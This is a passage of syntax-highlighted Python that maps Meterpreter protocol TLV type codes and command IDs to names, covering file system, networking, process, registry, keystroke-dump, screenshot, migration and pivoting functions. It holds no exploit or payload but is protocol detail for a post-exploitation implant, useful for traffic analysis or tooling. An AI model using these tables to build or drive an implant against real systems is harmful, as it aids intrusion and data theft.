class="number">1201</span>)] = <span class="string">&quot;TLV_TYPE_FILE_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1202</span>)] = <span class="string">&quot;TLV_TYPE_FILE_PATH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1203</span>)] = <span class="string">&quot;TLV_TYPE_FILE_MODE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1204</span>)] = <span class="string">&quot;TLV_TYPE_FILE_SIZE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1206</span>)] = <span class="string">&quot;TLV_TYPE_FILE_HASH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_COMPLEX | <span class="number">1221</span>)] = <span class="string">&quot;TLV_TYPE_STAT_BUF&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_BOOL    | <span class="number">1230</span>)] = <span class="string">&quot;TLV_TYPE_SEARCH_RECURSE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1231</span>)] = <span class="string">&quot;TLV_TYPE_SEARCH_GLOB&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1232</span>)] = <span class="string">&quot;TLV_TYPE_SEARCH_ROOT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">1233</span>)] = <span class="string">&quot;TLV_TYPE_SEARCH_RESULTS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1234</span>)] = <span class="string">&quot;TLV_TYPE_FILE_MODE_T&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1235</span>)] = <span class="string">&quot;TLV_TYPE_SEARCH_MTIME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1236</span>)] = <span class="string">&quot;TLV_TYPE_SEARCH_M_START_DATE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1237</span>)] = <span class="string">&quot;TLV_TYPE_SEARCH_M_END_DATE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1400</span>)] = <span class="string">&quot;TLV_TYPE_HOST_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1401</span>)] = <span class="string">&quot;TLV_TYPE_PORT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1402</span>)] = <span class="string">&quot;TLV_TYPE_INTERFACE_MTU&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1403</span>)] = <span class="string">&quot;TLV_TYPE_INTERFACE_FLAGS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1404</span>)] = <span class="string">&quot;TLV_TYPE_INTERFACE_INDEX&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1420</span>)] = <span class="string">&quot;TLV_TYPE_SUBNET&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1421</span>)] = <span class="string">&quot;TLV_TYPE_NETMASK&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1422</span>)] = <span class="string">&quot;TLV_TYPE_GATEWAY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">1423</span>)] = <span class="string">&quot;TLV_TYPE_NETWORK_ROUTE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1424</span>)] = <span class="string">&quot;TLV_TYPE_IP_PREFIX&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">1425</span>)] = <span class="string">&quot;TLV_TYPE_ARP_ENTRY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1430</span>)] = <span class="string">&quot;TLV_TYPE_IP&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1431</span>)] = <span class="string">&quot;TLV_TYPE_MAC_ADDRESS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1432</span>)] = <span class="string">&quot;TLV_TYPE_MAC_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">1433</span>)] = <span class="string">&quot;TLV_TYPE_NETWORK_INTERFACE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1434</span>)] = <span class="string">&quot;TLV_TYPE_IP6_SCOPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1440</span>)] = <span class="string">&quot;TLV_TYPE_SUBNET_STRING&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1441</span>)] = <span class="string">&quot;TLV_TYPE_NETMASK_STRING&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1442</span>)] = <span class="string">&quot;TLV_TYPE_GATEWAY_STRING&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1443</span>)] = <span class="string">&quot;TLV_TYPE_ROUTE_METRIC&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1444</span>)] = <span class="string">&quot;TLV_TYPE_ADDR_TYPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_BOOL  | <span class="number">1445</span>)] = <span class="string">&quot;TLV_TYPE_PROXY_CFG_AUTODETECT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING| <span class="number">1446</span>)] = <span class="string">&quot;TLV_TYPE_PROXY_CFG_AUTOCONFIGURL&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING| <span class="number">1447</span>)] = <span class="string">&quot;TLV_TYPE_PROXY_CFG_PROXY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING| <span class="number">1448</span>)] = <span class="string">&quot;TLV_TYPE_PROXY_CFG_PROXYBYPASS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1500</span>)] = <span class="string">&quot;TLV_TYPE_PEER_HOST&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1501</span>)] = <span class="string">&quot;TLV_TYPE_PEER_PORT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1502</span>)] = <span class="string">&quot;TLV_TYPE_LOCAL_HOST&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1503</span>)] = <span class="string">&quot;TLV_TYPE_LOCAL_PORT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1504</span>)] = <span class="string">&quot;TLV_TYPE_CONNECT_RETRIES&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">1505</span>)] = <span class="string">&quot;TLV_TYPE_NETSTAT_ENTRY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1506</span>)] = <span class="string">&quot;TLV_TYPE_PEER_HOST_RAW&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1507</span>)] = <span class="string">&quot;TLV_TYPE_LOCAL_HOST_RAW&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1530</span>)] = <span class="string">&quot;TLV_TYPE_SHUTDOWN_HOW&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">1000</span>)] = <span class="string">&quot;TLV_TYPE_HKEY&quot;</span></span><br><span class="line">TLV_TYPE_HKEY = TLV_META_TYPE_QWORD   | <span class="number">1000</span></span><br><span class="line">tlv_types[(TLV_TYPE_HKEY)] = <span class="string">&quot;TLV_TYPE_ROOT_KEY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1001</span>)] = <span class="string">&quot;TLV_TYPE_BASE_KEY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1002</span>)] = <span class="string">&quot;TLV_TYPE_PERMISSION&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1003</span>)] = <span class="string">&quot;TLV_TYPE_KEY_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1010</span>)] = <span class="string">&quot;TLV_TYPE_VALUE_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1011</span>)] = <span class="string">&quot;TLV_TYPE_VALUE_TYPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">1012</span>)] = <span class="string">&quot;TLV_TYPE_VALUE_DATA&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1013</span>)] = <span class="string">&quot;TLV_TYPE_TARGET_HOST&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1040</span>)] = <span class="string">&quot;TLV_TYPE_COMPUTER_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1041</span>)] = <span class="string">&quot;TLV_TYPE_OS_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1042</span>)] = <span class="string">&quot;TLV_TYPE_USER_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1043</span>)] = <span class="string">&quot;TLV_TYPE_ARCHITECTURE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1045</span>)] = <span class="string">&quot;TLV_TYPE_SID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1048</span>)] = <span class="string">&quot;TLV_TYPE_LOCAL_DATETIME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1049</span>)] = <span class="string">&quot;TLV_TYPE_BUILD_TUPLE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1100</span>)] = <span class="string">&quot;TLV_TYPE_ENV_VARIABLE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1101</span>)] = <span class="string">&quot;TLV_TYPE_ENV_VALUE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">1102</span>)] = <span class="string">&quot;TLV_TYPE_ENV_GROUP&quot;</span></span><br><span class="line">tlv_types[(<span class="number">1</span> &lt;&lt; <span class="number">0</span>)] = <span class="string">&quot;DELETE_KEY_FLAG_RECURSIVE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">2000</span>)] = <span class="string">&quot;TLV_TYPE_BASE_ADDRESS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2001</span>)] = <span class="string">&quot;TLV_TYPE_ALLOCATION_TYPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2002</span>)] = <span class="string">&quot;TLV_TYPE_PROTECTION&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2003</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_PERMS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">2004</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_MEMORY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">2005</span>)] = <span class="string">&quot;TLV_TYPE_ALLOC_BASE_ADDRESS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2006</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_STATE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2007</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_TYPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2008</span>)] = <span class="string">&quot;TLV_TYPE_ALLOC_PROTECTION&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2300</span>)] = <span class="string">&quot;TLV_TYPE_PID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2301</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2302</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_PATH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">2303</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_GROUP&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2304</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_FLAGS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2305</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_ARGUMENTS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2306</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_ARCH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2307</span>)] = <span class="string">&quot;TLV_TYPE_PARENT_PID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2309</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_ARCH_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2400</span>)] = <span class="string">&quot;TLV_TYPE_IMAGE_FILE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2401</span>)] = <span class="string">&quot;TLV_TYPE_IMAGE_FILE_PATH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2402</span>)] = <span class="string">&quot;TLV_TYPE_PROCEDURE_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">2403</span>)] = <span class="string">&quot;TLV_TYPE_PROCEDURE_ADDRESS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">2404</span>)] = <span class="string">&quot;TLV_TYPE_IMAGE_BASE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">2405</span>)] = <span class="string">&quot;TLV_TYPE_IMAGE_GROUP&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2406</span>)] = <span class="string">&quot;TLV_TYPE_IMAGE_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2500</span>)] = <span class="string">&quot;TLV_TYPE_THREAD_ID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2502</span>)] = <span class="string">&quot;TLV_TYPE_THREAD_PERMS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2510</span>)] = <span class="string">&quot;TLV_TYPE_EXIT_CODE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">2511</span>)] = <span class="string">&quot;TLV_TYPE_ENTRY_POINT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">2512</span>)] = <span class="string">&quot;TLV_TYPE_ENTRY_PARAMETER&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2513</span>)] = <span class="string">&quot;TLV_TYPE_CREATION_FLAGS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2540</span>)] = <span class="string">&quot;TLV_TYPE_REGISTER_NAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2541</span>)] = <span class="string">&quot;TLV_TYPE_REGISTER_SIZE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2542</span>)] = <span class="string">&quot;TLV_TYPE_REGISTER_VALUE_32&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">2550</span>)] = <span class="string">&quot;TLV_TYPE_REGISTER&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2600</span>)] = <span class="string">&quot;TLV_TYPE_TERMINAL_ROWS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">2601</span>)] = <span class="string">&quot;TLV_TYPE_TERMINAL_COLUMNS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING   | <span class="number">2650</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_SEARCH_NEEDLE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP    | <span class="number">2651</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_SEARCH_RESULTS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT     | <span class="number">2652</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_SEARCH_MATCH_LEN&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD    | <span class="number">2653</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_SEARCH_START_ADDR&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD    | <span class="number">2654</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_SEARCH_SECT_LEN&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD    | <span class="number">2655</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_SEARCH_MATCH_ADDR&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING   | <span class="number">2656</span>)] = <span class="string">&quot;TLV_TYPE_MEMORY_SEARCH_MATCH_STR&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">3000</span>)] = <span class="string">&quot;TLV_TYPE_IDLE_TIME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">3001</span>)] = <span class="string">&quot;TLV_TYPE_KEYS_DUMP&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">3002</span>)] = <span class="string">&quot;TLV_TYPE_DESKTOP&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW  | <span class="number">3002</span>)] = <span class="string">&quot;TLV_TYPE_DESKTOP_SCREENSHOT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT | <span class="number">3008</span>)] = <span class="string">&quot;TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">3014</span>)] = <span class="string">&quot;TLV_TYPE_KEYS_SEND&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">3015</span>)] = <span class="string">&quot;TLV_TYPE_MOUSE_ACTION&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">3016</span>)] = <span class="string">&quot;TLV_TYPE_MOUSE_X&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">3017</span>)] = <span class="string">&quot;TLV_TYPE_MOUSE_Y&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">3018</span>)] = <span class="string">&quot;TLV_TYPE_KEYEVENT_SEND&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">4000</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_SOURCENAME&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">4001</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_HANDLE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4002</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_NUMRECORDS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4003</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_READFLAGS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4004</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_RECORDOFFSET&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4006</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_RECORDNUMBER&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4007</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_TIMEGENERATED&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4008</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_TIMEWRITTEN&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4009</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_ID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4010</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_TYPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4011</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_CATEGORY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">4012</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_STRING&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">4013</span>)] = <span class="string">&quot;TLV_TYPE_EVENT_DATA&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4100</span>)] = <span class="string">&quot;TLV_TYPE_POWER_FLAGS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4101</span>)] = <span class="string">&quot;TLV_TYPE_POWER_REASON&quot;</span></span><br><span class="line"></span><br><span class="line">cmd_ids = &#123;&#125;</span><br><span class="line"></span><br><span class="line">cmd_ids[<span class="number">1</span>] = <span class="string">&quot;CORE_CHANNEL_CLOSE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">2</span>] = <span class="string">&quot;CORE_CHANNEL_EOF&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3</span>] = <span class="string">&quot;CORE_CHANNEL_INTERACT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">4</span>] = <span class="string">&quot;CORE_CHANNEL_OPEN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">5</span>] = <span class="string">&quot;CORE_CHANNEL_READ&quot;</span></span><br><span class="line">cmd_ids[<span class="number">6</span>] = <span class="string">&quot;CORE_CHANNEL_SEEK&quot;</span></span><br><span class="line">cmd_ids[<span class="number">7</span>] = <span class="string">&quot;CORE_CHANNEL_TELL&quot;</span></span><br><span class="line">cmd_ids[<span class="number">8</span>] = <span class="string">&quot;CORE_CHANNEL_WRITE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">9</span>] = <span class="string">&quot;CORE_CONSOLE_WRITE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">10</span>] = <span class="string">&quot;CORE_ENUMEXTCMD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">11</span>] = <span class="string">&quot;CORE_GET_SESSION_GUID&quot;</span></span><br><span class="line">cmd_ids[<span class="number">12</span>] = <span class="string">&quot;CORE_LOADLIB&quot;</span></span><br><span class="line">cmd_ids[<span class="number">13</span>] = <span class="string">&quot;CORE_MACHINE_ID&quot;</span></span><br><span class="line">cmd_ids[<span class="number">14</span>] = <span class="string">&quot;CORE_MIGRATE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15</span>] = <span class="string">&quot;CORE_NATIVE_ARCH&quot;</span></span><br><span class="line">cmd_ids[<span class="number">16</span>] = <span class="string">&quot;CORE_NEGOTIATE_TLV_ENCRYPTION&quot;</span></span><br><span class="line">cmd_ids[<span class="number">17</span>] = <span class="string">&quot;CORE_PATCH_URL&quot;</span></span><br><span class="line">cmd_ids[<span class="number">18</span>] = <span class="string">&quot;CORE_PIVOT_ADD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">19</span>] = <span class="string">&quot;CORE_PIVOT_REMOVE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">20</span>] = <span class="string">&quot;CORE_PIVOT_SESSION_DIED&quot;</span></span><br><span class="line">cmd_ids[<span class="number">21</span>] = <span class="string">&quot;CORE_SET_SESSION_GUID&quot;</span></span><br><span class="line">cmd_ids[<span class="number">22</span>] = <span class="string">&quot;CORE_SET_UUID&quot;</span></span><br><span class="line">cmd_ids[<span class="number">23</span>] = <span class="string">&quot;CORE_SHUTDOWN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">24</span>] = <span class="string">&quot;CORE_TRANSPORT_ADD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">25</span>] = <span class="string">&quot;CORE_TRANSPORT_CHANGE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">26</span>] = <span class="string">&quot;CORE_TRANSPORT_GETCERTHASH&quot;</span></span><br><span class="line">cmd_ids[<span class="number">27</span>] = <span class="string">&quot;CORE_TRANSPORT_LIST&quot;</span></span><br><span class="line">cmd_ids[<span class="number">28</span>] = <span class="string">&quot;CORE_TRANSPORT_NEXT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">29</span>] = <span class="string">&quot;CORE_TRANSPORT_PREV&quot;</span></span><br><span class="line">cmd_ids[<span class="number">30</span>] = <span class="string">&quot;CORE_TRANSPORT_REMOVE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">31</span>] = <span class="string">&quot;CORE_TRANSPORT_SETCERTHASH&quot;</span></span><br><span class="line">cmd_ids[<span class="number">32</span>] = <span class="string">&quot;CORE_TRANSPORT_SET_TIMEOUTS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">33</span>] = <span class="string">&quot;CORE_TRANSPORT_SLEEP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1001</span>] = <span class="string">&quot;STDAPI_FS_CHDIR&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1002</span>] = <span class="string">&quot;STDAPI_FS_CHMOD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1003</span>] = <span class="string">&quot;STDAPI_FS_DELETE_DIR&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1004</span>] = <span class="string">&quot;STDAPI_FS_DELETE_FILE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1005</span>] = <span class="string">&quot;STDAPI_FS_FILE_COPY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1006</span>] = <span class="string">&quot;STDAPI_FS_FILE_EXPAND_PATH&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1007</span>] = <span class="string">&quot;STDAPI_FS_FILE_MOVE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1008</span>] = <span class="string">&quot;STDAPI_FS_GETWD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1009</span>] = <span class="string">&quot;STDAPI_FS_LS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1010</span>] = <span class="string">&quot;STDAPI_FS_MD5&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1011</span>] = <span class="string">&quot;STDAPI_FS_MKDIR&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1012</span>] = <span class="string">&quot;STDAPI_FS_MOUNT_SHOW&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1013</span>] = <span class="string">&quot;STDAPI_FS_SEARCH&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1014</span>] = <span class="string">&quot;STDAPI_FS_SEPARATOR&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1015</span>] = <span class="string">&quot;STDAPI_FS_SHA1&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1016</span>] = <span class="string">&quot;STDAPI_FS_STAT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1017</span>] = <span class="string">&quot;STDAPI_NET_CONFIG_ADD_ROUTE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1018</span>] = <span class="string">&quot;STDAPI_NET_CONFIG_GET_ARP_TABLE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1019</span>] = <span class="string">&quot;STDAPI_NET_CONFIG_GET_INTERFACES&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1020</span>] = <span class="string">&quot;STDAPI_NET_CONFIG_GET_NETSTAT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1021</span>] = <span class="string">&quot;STDAPI_NET_CONFIG_GET_PROXY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1022</span>] = <span class="string">&quot;STDAPI_NET_CONFIG_GET_ROUTES&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1023</span>] = <span class="string">&quot;STDAPI_NET_CONFIG_REMOVE_ROUTE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1024</span>] = <span class="string">&quot;STDAPI_NET_RESOLVE_HOST&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1025</span>] = <span class="string">&quot;STDAPI_NET_RESOLVE_HOSTS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1026</span>] = <span class="string">&quot;STDAPI_NET_SOCKET_TCP_SHUTDOWN&quot;</span></span><br><span 